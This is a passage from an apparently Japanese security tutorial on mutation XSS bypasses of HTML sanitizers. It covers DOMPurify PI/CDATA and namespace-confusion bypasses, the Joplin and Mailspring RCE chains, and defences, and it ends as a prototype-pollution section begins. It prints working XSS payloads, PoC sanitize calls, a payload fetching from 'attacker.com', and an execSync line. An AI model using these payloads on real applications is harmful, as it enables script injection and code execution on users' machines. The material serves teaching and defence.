- **なぜ動くのか**: サニタイザ内部の `DOMParser` はスクリプト無効とみなすため、`<noscript>` の中身を raw text として扱い、`</noscript>` までをテキストとして素通しする。実ページはスクリプト有効なので、同じ文字列を再パースすると `<noscript>` の中身がHTMLとして再解釈され、`<style>` の後の `</noscript>` で `<noscript>` が閉じ、`<img onerror>` が本物の要素として出現・発火する。

#### 例3: Form + MathML + Style（Parsing Round Trip）

```html
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

- **なぜ動くのか**: `<form>` の入れ子不可ルールにより、1回目のパースと再パースで `</form>` の効き方が変わる。`<mtext>` は MathMLテキスト統合点、`<mglyph>` はその直下で MathML 名前空間に留まる例外要素。`<style>` が MathML の foreign content 内にあるため raw text ではなくなり、`</math>` で名前空間が HTML に戻った後の `<img onerror>` が本物の要素として解釈される。複数のパース癖を直列に積み上げた高度なベクタ。

#### 例4: SVG × Style × 属性値（名前空間混同の典型）

```html
<svg><style><a alt="</style><img src=x onerror=alert(1)>">
```

- **なぜ動くのか**: SVG 名前空間内の `<style>` は raw text 要素ではない。したがって `<a>` の `alt` 属性値に含まれる `</style>` が、シリアライズ→再パースの過程で本物の閉じタグとして機能し、続く `<img onerror>` が HTML 要素として出現する。後述の Joplin（CVE-2023-33726）はまさにこのペイロードで攻略された。

#### 例5: DOMPurify < 2.0.17 名前空間混同（Michał Bentkowski）

```html
<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
```

- **なぜ動くのか**: `<form>` の入れ子と MathML/SVG の名前空間切り替えを組み合わせ、DOMPurify のパースと実ブラウザのパースで `<style>` の閉じ位置と要素の所属名前空間がズレるように仕組む。DOMPurify（2.0.17 未満）は `<style>` の中身を raw text として安全と判断するが、シリアライズ→再パースの過程で `</style>` が本物の閉じタグとして効き、`<img onerror>` が独立したHTML要素として蘇る。

> 出典: Mutation XSS via namespace confusion – DOMPurify +2.0.17 bypass（Michał Bentkowski / Securitum） — https://www.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass.html

#### 例6: DOMPurify < 2.2.2「From SVG and back」（Daniel Santos）

```html
<svg></p><textarea><title><style></textarea><img src=x onerror=alert(1)></style></title></svg>
```

- **なぜ動くのか**: `<svg>` で SVG 名前空間に入ると `<style>` の子孫は通常のHTMLとして描画されうる。`</p>` や `<textarea>`/`<title>`（RCDATA要素）を挟んでパース状態を意図的にずらし、SVG から HTML へ"戻る"境界の解釈差で `<img onerror>` を実体化させる。DOMPurify 2.2.2 で修正。

> 出典: From SVG and back, yet another mutation XSS via namespace confusion for DOMPurify < 2.2.2 bypass（Daniel Santos） — https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f

---

### ケーススタディ①: Joplin（CVE-2023-33726）―― mXSS から任意コマンド実行へ

**Joplin** はオープンソースのノートアプリで、Electron（Chromiumベースのデスクトップアプリケーションフレームワーク）上で動作します。

#### 脆弱性の原因

Joplin はHTMLサニタイズに **htmlparser2** という npm パッケージを使用していました。このパッケージは **「仕様準拠よりも速度を優先する（doesn't follow the specification and prefers speed over accuracy）」** という設計方針をとっており、ブラウザの HTML パーサとは異なる解釈をするケースがありました。

#### 攻撃ペイロード

```html
<svg><style><a alt="</style><img src=x onerror=alert(1)>">
```

htmlparser2 はこの入力を解析する際、SVG 名前空間内の `<style>` を HTML 名前空間と同様に raw text として扱い、中身をただのテキストと判断しました。しかし Electron（Chromium）のHTMLパーサは仕様に忠実に SVG 内の `<style>` を foreign content として扱うため、`</style>` が閉じタグとして機能し、`<img onerror>` が本物の要素として出現しました。

#### 影響範囲

Joplin は Electron 上で動作し、Node.js へのアクセス権限を持っていたため、mXSS による JavaScript 実行は **任意のコマンド実行（RCE: Remote Code Execution）** に直結しました。ノートアプリに悪意のあるHTMLを含むノートを共有するだけで、被害者のマシン上で任意のコマンドが実行される危険がありました。

この事例は、mXSS が単なる「ブラウザでアラートが出る」レベルの問題ではなく、デスクトップアプリでは **OS レベルの侵害に直結する** ことを明確に示しています。

> 出典: mXSS: The Vulnerability Hiding in Your Code（Sonar） — https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/

---

### ケーススタディ②: Mailspring ―― mXSS → サンドボックス脱出 → RCE

Sonar が発見した Mailspring（デスクトップメールクライアント、Electron製）の脆弱性は、mXSS を起点とした多段階の攻撃チェーンで **RCE（任意コマンド実行）** に至った事例です。

#### 攻撃チェーンの全体像

**ステップ1 ―― mXSS（SVG/style のパーサ差分）:**
攻撃者は SVG 内の `<style>` を利用した mXSS ペイロードを含むメールを送信します。

**ステップ2 ―― サンドボックスの初期防御:**
メールの初回表示時は、コンテンツがサンドボックス化された iframe 内にレンダリングされるため、JavaScript は実行されません。

**ステップ3 ―― 返信/転送によるサンドボックス脱出:**
被害者がそのメールに**返信または転送**すると、メール本文がサンドボックスの外で再レンダリングされます。この再レンダリング時に mXSS による変異が発生し、JavaScript が実行可能になります。

**ステップ4 ―― CSP バイパスと二次サニタイズの回避:**
Mailspring の CSP（Content Security Policy）には設定ミスがあり、`<object>` タグが許可されていました。さらに、`<signature>` タグ（Mailspring 独自のカスタム要素）を使うことで二次的なサニタイズ処理を回避できました。

最終的なペイロード:

```html
<svg><style><a title="</style><signature><object data='attacker.com/payload'></object></signature>">
```

**ステップ5 ―― RCE への到達:**

2つの経路が存在しました。

- **経路A（Electron の既知脆弱性）**: Mailspring は Electron 17.4.0（Chrome 98 ベース）を使用しており、**CVE-2022-1364**（Chrome の型混同脆弱性）に対して脆弱でした。
- **経路B（CSS による情報窃取 → ファイルアクセス → コマンド実行）**: CSS の `url()` を使って添付ファイルのパスを外部に漏洩させ、same-origin のファイルアクセスを経由して `top.require('child_process').execSync('arbitrary_command')` により任意のコマンドを実行しました。

#### タイムライン

- 2023年4月27日: Sonar が初回報告
- 2023年7月4日: ベンダー承認
- 2023年7月29日: CSP の強化パッチ適用
- 2024年3月9日: Sonar がブログ記事を公開

影響を受けたバージョンは **Mailspring 1.11.0 未満** です。

この事例が示す教訓は明確です。**mXSS 単体は JavaScript 実行に過ぎないが、Electron アプリの特権的な実行環境、CSP の設定ミス、古いランタイムの既知脆弱性が連鎖すると、1通のメールで被害者のマシンを完全に掌握できる。**

> 出典: Reply to Calc: The Attack Chain to Compromise Mailspring（Sonar） — https://www.sonarsource.com/blog/reply-to-calc-the-attack-chain-to-compromise-mailspring/

---

### DOMPurify バイパスの歴史とバージョン依存（陳腐化への注意）

mXSS ペイロードは**サニタイザのバージョンに強く依存**します。以下は DOMPurify（最も広く使われるクライアントサイド・サニタイザ）の主要な mXSS 関連バイパスと修正の時系列です。

| 時期 | バイパスの種類 | 影響バージョン | 修正バージョン | 備考 |
|---|---|---|---|---|
| 2020 | MathML 名前空間混同（Bentkowski, 例5） | < 2.0.17 | **2.0.17** | 親名前空間の検証を導入 |
| 2020 | SVG 名前空間混同「From SVG and back」（Santos, 例6） | < 2.2.2 | **2.2.2** | SVG→HTML 境界の解釈差 |
| 2020–2021 | 追加の名前空間/mglyph 系（2.2.x で継続的に修正） | 2.2.x 系 | 2.2.3 / 2.2.4 / 2.2.6 ほか | いたちごっこが続いた時期 |
| 2024公開 | **ネスト（入れ子）ベース mXSS**（CVE-2024-47875） | 修正前の全般 | **2.5.0 / 3.1.3** | 深い入れ子で再パース挙動が発散 |
| 2025公開 | **テンプレートリテラル正規表現の不備**（CVE-2025-26791） | < 3.2.4 | **3.2.4** | `SAFE_FOR_TEMPLATES: true` 時のみ |
| 2025公開 | **`<textarea>` raw text 検証漏れ**（CVE-2025-15599） | 3.1.3–3.2.6 / 2.5.3–2.5.8 | **3.2.7**（3.x 系） | 2.x 系は未修正のまま |

**実務上の教訓:**

- **常に最新の DOMPurify へ更新する。** mXSS 修正は"追いつき"の連続であり、古い版に固定するとその後に発見された回避に必ず晒される。
- **2.x 系は一部 CVE（例: CVE-2025-15599）が未修正のまま**。2.x を継続利用しているプロジェクトは 3.x への移行を検討すべき。
- **非デフォルト設定は攻撃面を広げる**。`SAFE_FOR_TEMPLATES`（CVE-2025-26791）や `SAFE_FOR_XML`（CVE-2025-15599）のように、既定から外れたオプションが新たなバイパスの入口になった例が複数ある。

#### mXSS の影響を受けた他のサニタイザ

DOMPurify だけが mXSS の標的ではありません。Sonar の記事では以下のサニタイザにも脆弱性があったことが言及されています。

- **HtmlSanitizer**（CVE-2023-44390）
- **TYPO3**（CVE-2023-38500）
- **OWASP java-html-sanitizer**
- **Mozilla bleach**
- **Google Caja**
- **DOMPurify 2.0.0**

これらに共通するのは、**パーサの実装がブラウザのパーサと完全には一致しない** という構造的な問題です。

> 出典: Attack Classes & Bypass History（cure53/DOMPurify Wiki） — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History

---

### 防御策のまとめ

mXSS への対策は「サニタイザを信じきる」ことではなく、「**パーサ差分が生まれないように処理フロー全体を設計する**」ことです。Sonar の記事が推奨する防御策を軸に整理します。

#### 1. クライアントサイド・サニタイズ（最重要）

**描画するのと同じブラウザ上でサニタイズする。** サーバサイドのサニタイズは配信先ブラウザの多様さゆえにパーサ差分を排除できず、mXSS に構造的に弱い。クライアントサイド・サニタイザ（DOMPurify 等）を使えば、サニタイズとレンダリングが同じパーサで行われるため差分が最小化されます。

#### 2. 再パースの回避

**サニタイズ済みのDOMツリーを直接挿入する。** サニタイズ結果をHTML文字列にシリアライズしてから `innerHTML` で再挿入するのではなく、DOMツリーそのものを挿入すれば、シリアライズ→再パースのラウンドトリップで生じる変異を回避できます。

#### 3. サニタイズ後のエンコード

サニタイズ後にHTMLを文字列として扱う必要がある場合は、**raw content をエンコードする**。サニタイズ済み文字列に対して後から加工・連結・再パースを行わない（desanitization の回避）。

#### 4. Foreign content の制限

ユーザーHTMLに SVG/MathML を許可する必要がなければ、**SVG/MathML 要素を丸ごと削除する**。名前空間切り替えが発生しなければ、mXSS の最大の攻撃面が消滅します。

#### 5. 文脈の一貫性

サニタイザがフラグメントを解析する文脈と、アプリケーションがそのHTMLを埋め込む文脈を一致させる。たとえば、HTML 文脈でサニタイズしたHTMLを SVG 内に挿入しないようにする。

#### 6. Sanitizer API（ブラウザネイティブのサニタイズ）

**WICG（Web Incubator Community Group）で策定中の Sanitizer API** は、ブラウザ自身が提供するネイティブのサニタイズ機能です。ブラウザのパーサと完全に同じパーサでサニタイズが行われるため、パーサ差分の問題が原理的に解消されます。標準化が進めば、mXSS に対する最も根本的な解決策になり得ます。

#### 7. 多層防御

サニタイザは万能ではないことを前提に、以下を重ねます。

- **CSP（Content Security Policy）** で `script-src` を厳格化し、`'unsafe-inline'` を排除する。nonce/hash 方式を採用する。
- **Trusted Types** で `innerHTML` への生文字列代入を型レベルで禁止する。
- サニタイザは**常に最新版**を使い、依存の自動更新（Dependabot / Renovate 等）を運用に組み込む。

> 出典: mXSS: The Vulnerability Hiding in Your Code（Sonar） — https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/

---

### このセクションの要点（まとめ）

- mXSS の核心は **「サニタイザの目には raw text、ブラウザの目には HTML」** となる文字列を作ること。バグではなく**パーサ差分（parser differential）**という仕様レベルの落とし穴を突く。
- Sonar は mXSS を **4つのパターン** に分類した: **Parser Differentials（パーサ差分）**、**Parsing Round Trip（パース往復）**、**Desanitization（脱サニタイズ）**、**Context-Dependent Parsing（文脈依存パース）**。
- SonarSource mXSS チートシートは、HTML/SVG/MathML の各名前空間における要素の予期しない挙動（foster parenting、form の入れ子不可、foreign content breaker 等）を網羅的に整理した実務資料。
- **Joplin（CVE-2023-33726）** は、仕様非準拠のパーサ（htmlparser2）と Electron の Node.js 権限の組み合わせにより、mXSS が RCE に直結した事例。
- **Mailspring** は、mXSS → 返信/転送によるサンドボックス脱出 → CSP バイパス → RCE という多段階の攻撃チェーンで、1通のメールからマシンを掌握できた事例。
- 防御の中核は **クライアントサイド・サニタイズ**（同一パーサで無害化）、**再パースの回避**（DOMツリーの直接挿入）、**foreign content の制限**、**Sanitizer API への移行**。サニタイザの最新化と多層防御（CSP、Trusted Types）を必ず重ねる。

---

### 出典一覧

- mXSS: The Vulnerability Hiding in Your Code（Sonar） — https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/
- SonarSource / mxss-cheatsheet（GitHub / GitHub Pages） — https://github.com/SonarSource/mxss-cheatsheet / https://sonarsource.github.io/mxss-cheatsheet/
- mXSS Explained（SonarSource） — https://sonarsource.github.io/mxss-cheatsheet/explained/
- Reply to Calc: The Attack Chain to Compromise Mailspring（Sonar） — https://www.sonarsource.com/blog/reply-to-calc-the-attack-chain-to-compromise-mailspring/
- mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations（Heiderich et al., ACM CCS 2013） — https://cure53.de/fp170.pdf
- Mutation XSS via namespace confusion – DOMPurify +2.0.17 bypass（Michał Bentkowski / Securitum） — https://www.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass.html
- From SVG and back … DOMPurify < 2.2.2 bypass（Daniel Santos） — https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f
- Attack Classes & Bypass History（cure53/DOMPurify Wiki） — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History
- Code Vulnerabilities Put Skiff Emails at Risk（Sonar） — https://www.sonarsource.com/blog/code-vulnerabilities-put-skiff-emails-at-risk

---

## mXSS補足: XMLパーサ差分によるDOMPurifyバイパス

本節では、前節までに学んだmXSS（Mutation XSS）の原理を踏まえ、**HTMLパーサとXMLパーサの構文解釈の違い**を突いたDOMPurifyバイパスの実例を深掘りする。主題となるのは、Flatt Security（現 GMO Flatt Security）のセキュリティエンジニアRyotaK氏が2024年4月に公開した研究「Bypassing DOMPurify with good old XML」である。この研究は、DOMPurifyの**XMLパースモード**において、Processing Instruction（処理命令）とCDATAセクションという2つのXML固有構文がmXSSベクタとなることを実証し、2段階にわたるバイパスと修正の攻防を記録した貴重な事例である。

> **サニタイザが見ている「木構造」と、ブラウザが最終的に描画する「木構造」が食い違うと、その差分がXSSになる。**

この一文が、本節で扱うすべての事例の共通原理である。

---

### 1. 背景: DOMPurifyのXMLパースモード

DOMPurifyは通常、入力をHTMLとしてパースする（`text/html`）。しかし`PARSER_MEDIA_TYPE`オプションに`"application/xhtml+xml"`を指定すると、内部で**XMLパーサ**（`DOMParser`のXMLモード）を使ってDOMツリーを構築する。XHTML準拠のアプリケーション、あるいはSVGやMathMLを多用する環境では、このモードが選択されることがある。

問題は、DOMPurifyがXMLパーサで構築したDOMツリーをサニタイズし、結果をシリアライズ（文字列化）した後、その文字列がアプリケーション側で`innerHTML`経由――つまり**HTMLパーサ**によって――再パースされるケースである。XMLパーサとHTMLパーサは構文の解釈規則が根本的に異なるため、同じ文字列が異なるDOMツリーに変換されうる。これがmXSSの温床となる。

RyotaK氏の研究は、セキュリティ研究者 @slonser\_ が発見したDOMPurifyの先行バイパスに対するパッチを調査する中で、**追加の2つのバイパス**を発見したという経緯で始まった。

---

### 2. 第1のバイパス: Processing Instruction（処理命令）の解釈差（DOMPurify 3.0.10）

#### Processing Instructionとは

XMLには**Processing Instruction（PI、処理命令）**と呼ばれる構文がある。形式は次の通りだ。

```
'<?' PITarget (S (Char* - (Char* '?>' Char*)))? '?>'
```

つまり `<?` で始まり、ターゲット名（PITarget）が続き、`?>` で終端する。XMLパーサはこの全体を1つのProcessing Instructionノードとして扱い、中身にどんな文字列が含まれていてもマークアップとしては解釈しない。

#### HTMLパーサにおける `<?` の扱い: bogus comment

HTMLの仕様にはProcessing Instructionという概念がない。HTMLパーサが `<?` に遭遇すると、HTML仕様のトークナイゼーション規則により**bogus comment state（不正なコメント状態）**に遷移する。bogus commentの終端は `?>` ではなく、**最初に出現する `>`（山括弧）** である。

この差が致命的な食い違いを生む。

#### 解釈差の具体例

次の文字列を考える。

```
<?xml-stylesheet ><h1>Hello</h1> ?>
```

**XMLパーサの解釈:**

XMLパーサにとって、これは `<?xml-stylesheet` で始まるPI全体（`?>` まで）が1つのノードである。`<h1>Hello</h1>` はPIの内部テキストに過ぎず、タグとしては認識されない。結果として、DOMツリーには**ProcessingInstructionノードが1つだけ**存在する。

**HTMLパーサの解釈:**

HTMLパーサにとって、`<?xml-stylesheet ` は bogus comment の開始であり、最初の `>` で即座にコメントが閉じる。つまり `<?xml-stylesheet >` がコメント部分となり、それ以降の `<h1>Hello</h1> ?>` は**通常のHTMLマークアップとして解釈**される。`<h1>` タグが生きた要素として出現する。

#### バイパスの実証

DOMPurify 3.0.10において、この解釈差を利用した以下のPoCが成立した。

```javascript
document.documentElement.innerHTML = DOMPurify.sanitize(
  "<?img ><img src onerror=alert(1)>?",
  { PARSER_MEDIA_TYPE: "application/xhtml+xml" }
);
```

**攻撃の流れ:**

1. DOMPurifyはXMLパーサで入力をパースする。`<?img ><img src onerror=alert(1)>?` 全体が `<?img` をターゲットとするProcessing Instructionノードとなる（終端の `>?` はXML的には `?>` の前に `>` があるだけで、PIの内部テキスト）。
2. DOMPurifyのサニタイズロジックはこのPIノードを走査するが、当時のバージョンでは**Processing Instructionノードに対する除去処理が実装されていなかった**。PIの中身はテキストとして扱われるため、`<img onerror=...>` は要素ノードとしては存在せず、サニタイザの目には無害に映る。
3. サニタイズ後の文字列がシリアライズされ、`innerHTML`（HTMLパーサ）に渡される。
4. HTMLパーサは `<?img >` の時点でbogus commentを閉じ、続く `<img src onerror=alert(1)>` を**通常のHTML要素として解釈**する。
5. `onerror` イベントハンドラが発火し、`alert(1)` が実行される。

---

### 3. 最初のパッチとnodeName混同

DOMPurifyの開発チームはこのバイパスを受け、Processing Instructionノードをフィルタリングするパッチを適用した。具体的には、ツリーウォーカーの`whatToShow`に`NodeFilter.SHOW_PROCESSING_INSTRUCTION`フラグを追加し、PIノードがサニタイズ対象として走査されるようにした。

しかし、この修正には**仕様由来の落とし穴**があった。

#### nodeNameの仕様

DOM仕様では、各ノードタイプの`nodeName`プロパティが返す値は次のように定義されている。

| ノードタイプ | `nodeName` の返り値 |
|---|---|
| Element | タグ名（`"div"`, `"img"` 等） |
| Text | `"#text"` |
| Comment | `"#comment"` |
| **ProcessingInstruction** | **そのターゲット名（PITarget）** |

ここで重要なのは、ProcessingInstructionノードの`nodeName`は`"#processing-instruction"`のような固定値ではなく、**PITargetの文字列そのものを返す**という点である。

つまり `<?img ?>` というPIの`nodeName`は `"img"` になる。

#### nodeName混同によるバイパス継続

DOMPurifyのサニタイズロジックは、ノードの`nodeName`を許可リスト（allowed tags）と照合して、許可されたタグかどうかを判定する。PIノードが走査対象に加わっても、`<?img ?>` のnodeNameは `"img"` であり、`<img>` はDOMPurifyの既定許可リストに含まれている。その結果、PIノードは「許可されたタグである」と誤判定され、**除去されずに残存した**。

つまり最初のパッチは、PIノードを「見る」ようにはなったが、PIノードと通常のElement要素を**nodeNameだけでは区別できない**という仕様上の特性により、実質的にバイパスが継続した。

---

### 4. 第2のパッチ: Processing Instructionの完全除去

この問題を根本的に解決するため、DOMPurifyは**ノードタイプによる判定**を追加した。

```javascript
if (currentNode.nodeType === 7) {
  _forceRemove(currentNode);
  return true;
}
```

`nodeType === 7` はProcessing Instructionノードを示す定数であり、nodeNameの内容にかかわらず、PIノードであれば無条件に除去する。これにより、Processing Instructionを利用したバイパスは塞がれた。

---

### 5. 第2のバイパス: CDATAセクションの解釈差（DOMPurify 3.0.11）

PIの問題が修正されたDOMPurify 3.0.11に対し、RyotaK氏は**CDATAセクション**という別のXML固有構文を用いた第2のバイパスを発見した。

#### CDATAセクションとは

XMLにおけるCDATAセクションは、以下の形式でテキストをリテラル（文字通り）に保持する構文である。

```
<![CDATA[ ... ]]>
```

`<![CDATA[` と `]]>` で囲まれた内容は、XMLパーサによって**エスケープ処理なしの生テキスト**として扱われる。内部に `<` や `&` が含まれていても、マークアップやエンティティ参照としては解釈されない。

#### HTMLパーサにおけるCDATAの扱い

HTMLパーサはCDATAセクションを**ネイティブには認識しない**。ただし、HTML仕様には名前空間に応じた分岐規則がある。

HTML仕様のトークナイゼーション規則には次のように定義されている。

> **"If there is an adjusted current node and it is not an element in the HTML namespace, switch to the CDATA section state. Otherwise, this is a parse error. Create a comment token... Switch to the bogus comment state."**

つまり:

- **SVG/MathML名前空間内**（非HTML名前空間）: CDATAセクションとして正しく認識される。
- **HTML名前空間内**: `<![CDATA[` はパースエラーとなり、**bogus comment state** に遷移する。bogus commentの終端は（PIの場合と同様に）**最初に出現する `>`** である。

#### 解釈差の具体例

次の文字列を考える。

```
<![CDATA[ ><img src onerror=alert(1)> ]]>
```

**XMLパーサの解釈:**

`<![CDATA[` から `]]>` までが1つのCDATAセクションノードであり、内部の `><img src onerror=alert(1)>` は単なるテキストとして扱われる。タグとしては認識されない。

**HTMLパーサの解釈（HTML名前空間内）:**

`<![CDATA[` はbogus commentの開始となり、最初の `>` で即座にコメントが閉じる。つまり `<![CDATA[ >` がコメント部分であり、続く `<img src onerror=alert(1)>` は**通常のHTMLマークアップとして生きた要素になる**。残りの ` ]]>` はテキストノードとして処理される。

#### バイパスの実証

DOMPurify 3.0.11において、以下のPoCが成立した。

```javascript
document.documentElement.innerHTML = DOMPurify.sanitize(
  "<![CDATA[ ><img src onerror=alert(1)> ]]>",
  { PARSER_MEDIA_TYPE: "application/xhtml+xml" }
);
```

**攻撃の流れ:**

1. DOMPurifyはXMLパーサで入力をパースする。全体が1つのCDATAセクションノードとなり、内部はテキスト扱い。
2. DOMPurifyのサニタイズロジックはCDATAセクションノードを走査するが、3.0.11時点では**CDATAセクションノードに対する除去処理が未実装**だった（PIの修正で追加されたのは `nodeType === 7` の判定のみで、CDATAセクションは `nodeType === 4` という別の値を持つ）。
3. サニタイズ後の文字列がシリアライズされ、`innerHTML`（HTMLパーサ）に渡される。
4. HTMLパーサはHTML名前空間で `<![CDATA[ >` をbogus commentとして処理し、続く `<img src onerror=alert(1)>` を通常の要素として構築する。
5. `onerror` が発火し、任意のJavaScriptが実行される。

---

### 6. 最終パッチ: CDATAセクションの完全除去

DOMPurifyはこの報告を受け、ツリーウォーカーに`NodeFilter.SHOW_CDATA_SECTION`フラグを追加し、CDATAセクションノードも走査・除去の対象とした。

PIの場合と異なり、CDATAセクションノードの`nodeName`は仕様上`"#cdata-section"`という固定文字列を返す。この値はDOMPurifyの許可リスト上のどのタグ名とも一致しないため、nodeName混同によるバイパスは成立しない。したがって、CDATAセクションについてはnodeTypeによる追加判定がなくても、`NodeFilter.SHOW_CDATA_SECTION`で走査対象に含めるだけで正しく除去できた。

---

### 7. 2つのバイパスの技術的対比

| | 第1のバイパス（PI） | 第2のバイパス（CDATA） |
|---|---|---|
| **対象バージョン** | DOMPurify 3.0.10 | DOMPurify 3.0.11 |
| **XML構文** | `<?target ... ?>` | `<![CDATA[ ... ]]>` |
| **XMLパーサの解釈** | PIノード1つ（内部はテキスト） | CDATAノード1つ（内部はテキスト） |
| **HTMLパーサの解釈** | bogus comment（`>` で終端）→ 後続がマークアップ化 | bogus comment（`>` で終端）→ 後続がマークアップ化 |
| **nodeType** | 7（PROCESSING_INSTRUCTION_NODE） | 4（CDATA_SECTION_NODE） |
| **nodeName** | PITargetの文字列（タグ名と衝突しうる） | `"#cdata-section"`（固定、衝突しない） |
| **修正方法** | `nodeType === 7` による無条件除去 | `SHOW_CDATA_SECTION` による走査追加 |
| **nodeName混同リスク** | あり（`<?img ?>` → nodeName `"img"`） | なし |

両バイパスに共通するのは、**HTMLのbogus comment stateの終端規則**（`>` で閉じる）とXML構文の終端規則（`?>` または `]]>`で閉じる）のズレを利用している点である。この食い違いにより、XMLパーサが「1ノードの内部テキスト」として無害と判定した領域の一部が、HTMLパーサでは「コメントの外側」に位置する生きたマークアップとして再解釈される。

---

### 8. 攻撃の前提条件と実際の影響

このバイパスが成立するには、以下の条件が必要である。

1. **DOMPurifyがXMLパースモードで使用されている**: `PARSER_MEDIA_TYPE: "application/xhtml+xml"` が設定されていること。デフォルトの `text/html` モードのみを使用するアプリケーションは影響を受けない。
2. **サニタイズ結果がHTMLコンテキストで挿入される**: `innerHTML` や `outerHTML` など、HTMLパーサによる再パースが発生する形で出力されること。

条件が限定的に見えるかもしれないが、XHTMLベースのアプリケーション、SVG/MathMLを多用するリッチテキストエディタ、あるいはサーバサイドでXMLとしてサニタイズしたHTMLをクライアントに送信する構成などでは、この条件を満たしうる。影響はフルXSS（任意のJavaScript実行）であり、深刻度は高い。

---

### 9. HackerOne #1024734: DOMPurifyの名前空間混同バイパス

RyotaK氏の研究がXML/HTMLパーサ間の**構文差**（PI、CDATA）を突くものであったのに対し、mXSSには**名前空間混同（namespace confusion）**という別の大きな攻撃クラスが存在する。HackerOneレポート#1024734（報告者: Daniel Santos）は、DOMPurify 2.2.2未満に存在したこの系統の脆弱性を報告したものである。

名前空間混同の核心は、HTML5パーシングアルゴリズムにおける**integration point（統合点）**の扱いにある。`<svg>` や `<math>` 要素の内部では、パーサはそれぞれSVG名前空間・MathML名前空間で解析を行うが、`<mglyph>` や `<mtext>` などの特定要素は**HTML integration point**として機能し、その子要素はHTML名前空間で解析される。このHTML名前空間への「復帰」のタイミングについて、サニタイザのツリー走査ロジックとブラウザの実際のパース挙動がずれていると、サニタイザが「まだ外来名前空間（SVG/MathML）の中にいる」と判定した要素が、ブラウザ描画時には「すでにHTML名前空間に戻っている」ことになり、HTMLのイベントハンドラとして有効化されてしまう。

DOMPurifyはこの報告を含む一連のフィードバックを受け、名前空間遷移の追跡ロジックを複数バージョンにわたって強化している。名前空間混同系のmXSSは2020年から2025年にかけて継続的に報告・修正が行われた長期的な攻撃クラスであり、このレポートはその初期の事例にあたる。

> 出典: Internet Bug Bounty DOMPurify バイパス報告 #1024734 — https://hackerone.com/reports/1024734

---

### 10. mXSSの先にあるもの: Electron RCEへの展開

mXSSの影響は「Webページ上でJavaScriptが実行される」ことにとどまらない。Electronアプリケーション（デスクトップメールクライアント、チャットアプリ、ノートアプリなど）では、レンダラプロセスがNode.js APIへのアクセスを持つ場合がある。このような環境でmXSSによるXSSが成立すると、`require('child_process').exec(...)` のようなコードを注入でき、**リモートコード実行（RCE）**に直結する。

前節（s4d）で扱ったMailspringのmXSSは、まさにこのパターンの実例であった。HTMLメール内のサニタイズ不備がmXSSを引き起こし、Electron環境でのRCEに至った事例である。DOMPurifyバイパスの研究が重要なのは、こうした「XSSの先にある被害」を見据えた上で、サニタイザの信頼性がセキュリティチェーン全体の要になっているからである。

---

### まとめ: 本節の教訓

| 資料 | 食い違いの発生源 | 悪用されたパーサ間の差 |
|---|---|---|
| Flatt（RyotaK）PI | XMLパースモード vs HTML再パース | PIの終端: `?>` vs bogus commentの `>` |
| Flatt（RyotaK）CDATA | XMLパースモード vs HTML再パース | CDATAの終端: `]]>` vs bogus commentの `>` |
| HackerOne #1024734 | SVG/MathML名前空間 vs HTML名前空間 | integration pointでの名前空間復帰タイミング |

いずれも「サニタイザがパースした瞬間のコンテキスト」と「ブラウザが最終的に描画する瞬間のコンテキスト」が一致していない、という一点に帰着する。防御側の一般原則は次の通りだ。

- **サニタイズと最終挿入を同一のパース経路で完結させる**: 文字列化（シリアライズ）を挟まず、`RETURN_DOM` / `RETURN_DOM_FRAGMENT` オプションでDOMノードのまま扱う。
- **サニタイザのバージョンを常に最新化する**: PI混同、CDATA混同、名前空間混同といった既知のmXSSクラスへのパッチを確実に追随する。
- **Trusted Typesを併用する**: 「サニタイズ済み文字列を無条件にinnerHTMLへ渡す」経路自体を型レベルで制限し、意図しない再パースの入り口を減らす。
- **XMLパースモードの使用を最小限にする**: `PARSER_MEDIA_TYPE: "application/xhtml+xml"` が本当に必要かを検討し、不要であれば既定のHTMLパースモードを使う。これだけでPI/CDATAクラスのバイパスリスクを排除できる。

> 出典: RyotaK, "Bypassing DOMPurify with good old XML"（Flatt Security, 2024年4月） — https://flatt.tech/research/posts/bypassing-dompurify-with-good-old-xml/

---

## プロトタイプ汚染 概説とガジェット集

反射型XSSやDOMベースXSSに慣れた読者でも、「プロトタイプ汚染（Prototype Pollution）」という言葉には身構えるかもしれません。しかし仕組み自体はシンプルです。本節では、JavaScriptのオブジェクトモデルという「土台」を汚す攻撃がなぜXSSに直結するのかを、プロトタイプチェーンの仕組みから丁寧に説明し、実際に悪用可能な「ガジェット」の具体例まで見ていきます。

### プロトタイプチェーンの基礎

JavaScriptのオブジェクトは、自分がプロパティを持っていなくても、`__proto__`という内部リンクをたどって「親」のオブジェクトのプロパティを参照できます。この親をたどる連鎖を**プロトタイプチェーン**と呼びます。

```js
const obj = {};
console.log(obj.toString); // 関数が返る
```

`obj`自体は`toString`を持っていませんが、`obj.__proto__`（すなわち`Object.prototype`）が持っているため、参照が「通って」しまいます。ここが攻撃の核心です。**すべての通常オブジェクトは最終的に`Object.prototype`にたどり着く**ため、もし攻撃者が`Object.prototype`に任意のプロパティを追加できれば、そのアプリケーション内の「あらゆるオブジェクト」が、書いた覚えのないプロパティを持っているように見えてしまいます。

```js
Object.prototype.isAdmin = true;
const user = {};
console.log(user.isAdmin); // true ← userには一切代入していないのに
```

これが「汚染（Pollution）」です。攻撃者が直接`Object.prototype.isAdmin = true`と書けるわけではありませんが、アプリケーションが持つ「オブジェクトのマージ処理」や「ネストしたキーの動的代入処理」に、ユーザー入力由来の`__proto__`というキーを紛れ込ませることで、間接的に同じ効果を得られます。

```js
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      if (target[key] === undefined) target[key] = {};
      merge(target[key], source[key]); // 再帰的に潜っていく
    } else {
      target[key] = source[key];
    }
  }
}

